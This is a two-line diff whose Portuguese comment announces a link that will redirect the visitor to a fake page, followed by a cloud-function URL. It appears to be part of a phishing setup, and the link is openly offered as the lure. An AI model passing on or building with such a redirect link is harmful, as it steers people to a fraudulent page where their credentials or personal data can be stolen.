@@ -1,0 +1,2 @@
+LINK QUE VAI REDIRECIONAR VOÇE PARA A PÁGINA FALSA:
+https://us-central1-vaulted-timing-403201.cloudfunctions.net/function-1888
